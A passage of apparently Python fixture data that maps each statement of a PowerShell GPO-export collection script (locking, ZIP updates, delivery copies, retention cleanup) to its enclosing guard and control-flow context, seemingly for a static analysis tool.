                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
            ),
        ),
        (
            "Add-Type -AssemblyName System.IO.Compression.FileSystem",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
            ),
        ),
        (
            "Join-Path $exportDir 'gpo-inventory.json'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $newest.FullName -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "catch []",
            ),
        ),
        (
            "New-Item -ItemType Directory -Path $CopyTo -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Out-Null",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Join-Path $CopyTo $newest.Name",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Copy-Item -LiteralPath $newest.FullName -Destination $partial",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "try",
            ),
        ),
        (
            "Move-Item -LiteralPath $partial -Destination $delivery -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "try",
            ),
        ),
        (
            "Test-Path -LiteralPath $partial",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "finally",
                "if-condition after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $partial -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "finally",
                "if (Test-Path -LiteralPath $partial) after []",
            ),
        ),
        (
            'Write-GpoLensCollectionLog @logArgs -Message "ZIP delivered: $delivery"',
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
            ),
        ),
        (
            "Get-GpoLensCompletedExports -OutputRoot $OutputRoot",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            (
                "Where-Object { [string]::Equals($_.BaseName.Substring(0, $_.BaseName.Length - "
                "16), $producerPrefix, [StringComparison]::Ordinal) }"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Select-Object -Skip $Retention",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Join-Path $OutputRoot $archive.BaseName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
            ),
        ),
        (
            "Assert-GpoLensRegularTree -Root $folder",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
            ),
        ),
        (
            "Remove-Item -LiteralPath $archive.FullName -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
                "guard Assert-GpoLensRegularTree -Root $folder",
            ),
        ),
        (
            "Remove-Item -LiteralPath $folder -Recurse -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
                "guard Assert-GpoLensRegularTree -Root $folder",
            ),
        ),
        (
            (
                'Write-GpoLensCollectionLog @logArgs -Message "Collection succeeded: '
                '$($newest.Name); retained at most $Retention exports"'
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            'Write-Host "Collection succeeded: $($newest.FullName)"',
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            (
                'Write-GpoLensCollectionLog @logArgs -Message "Collection failed: '
                '$($failure.Exception.Message)"'
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "catch []",
                "try",
            ),
        ),
        (
            "Write-Warning 'Unable to write collection failure log.'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "catch []",
                "catch []",
            ),
        ),
        (
            (
                "Invoke-GpoLensCollection -OutputRoot $OutputRoot -CollectorPath "
                "$CollectorPath ` -TaskName $TaskName ` -Retention $Retention -CopyTo $CopyTo "
                "-InventoryPath $InventoryPath ` -LogMaxBytes $LogMaxBytes -LogFiles $LogFiles"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "try",
                "guard if (-not $OutputRoot) -> throw",
            ),
        ),
        (
            'Write-Error "Collection failed: $($_.Exception.Message)" -ErrorAction Continue',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "catch []",
            ),
        ),
        (
            "[Text.UTF8Encoding]::new($false)",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            "[math]::Max(1, [int]($LogMaxBytes / 4) - 40)",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            "$line.Substring(0, $maxChars)",
            (
                "function Write-GpoLensCollectionLog",
                "if ($line.Length -gt $maxChars) after []",
            ),
        ),
        (
            "$encoding.GetByteCount($line)",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            "[IO.File]::AppendAllText($LogPath, $line, $encoding)",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            "$_.BaseName.Substring($_.BaseName.Length - 15)",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "[IO.Compression.ZipFile]::OpenRead($archive.FullName)",
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "try",
            ),
        ),
        (
            "$zip.GetEntry('AllGPOs.xml')",
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "try",
                "if-condition after []",
            ),
        ),
        (
            "$zip.Dispose()",
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "finally",
                "if ($zip) after []",
            ),
        ),
        (
            "[Collections.Generic.Stack[string]]::new()",
            ("function Assert-GpoLensRegularTree",),
        ),
        (
            "$pending.Push($Root)",
            ("function Assert-GpoLensRegularTree",),
        ),
        (
            "$pending.Pop()",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
            ),
        ),
        (
            "$pending.Push($child.FullName)",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
                "guard if ($child.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "if ($child.PSIsContainer) after []",
            ),
        ),
        (
            (
                "[Text.Encoding]::UTF8.GetString($bytes).TrimStart([char]0xFEFF).TrimEnd([char["
                ']]"`r`n")'
            ),
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
            ),
        ),
        (
            "[Text.Encoding]::UTF8.GetString($bytes).TrimStart([char]0xFEFF)",
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
            ),
        ),
        (
            "[Text.Encoding]::UTF8.GetString($bytes)",
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
            ),
        ),
        (
            "[string]::Equals($owner, $TaskName, [StringComparison]::OrdinalIgnoreCase)",
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
                "if-condition after []",
            ),
        ),
        (
            (
                "[IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
                "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "[IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $InventoryPath).ProviderPath)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "[Text.Encoding]::UTF8.GetString($inventoryBytes).TrimStart([char]0xFEFF)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "[Text.Encoding]::UTF8.GetString($inventoryBytes)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "[Collections.Generic.HashSet[guid]]::new()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
                "guard if (-not $inventory) -> throw",
            ),
        ),
        (
            "[guid]::TryParse([string]$entry.Id, [ref]$id)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
                "guard if (-not $inventory) -> throw",
                "foreach ($entry in @($inventory))",
                "if-condition after []",
            ),
        ),
        (
            "$ids.Add($id)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
                "guard if (-not $inventory) -> throw",
                "foreach ($entry in @($inventory))",
                (
                    "guard if (-not [guid]::TryParse([string]$entry.Id, [ref]$id) -or $id -eq "
                    "[guid]::Empty) -> throw"
                ),
                "if-condition after []",
            ),
        ),
        (
            "($_ | Out-String).TrimEnd()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "$previous.ContainsKey($_.FullName)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "[IO.Compression.ZipFile]::Open($newest.FullName, 'Update')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
            ),
        ),
        (
            "$zip.GetEntry('AllGPOs.xml')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "if-condition after []",
            ),
        ),
        (
            (
                "[IO.File]::WriteAllBytes((Join-Path $exportDir 'gpo-inventory.json'), "
                "$inventoryBytes)"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$zip.GetEntry('gpo-inventory.json')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$entry.Delete()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
                "if ($entry) after []",
            ),
        ),
        (
            "$zip.CreateEntry('gpo-inventory.json')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$entry.Open()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$stream.Write($inventoryBytes, 0, $inventoryBytes.Length)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
                "try",
            ),
        ),
        (
            "$stream.Dispose()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
                "finally",
            ),
        ),
        (
            "$zip.Dispose()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
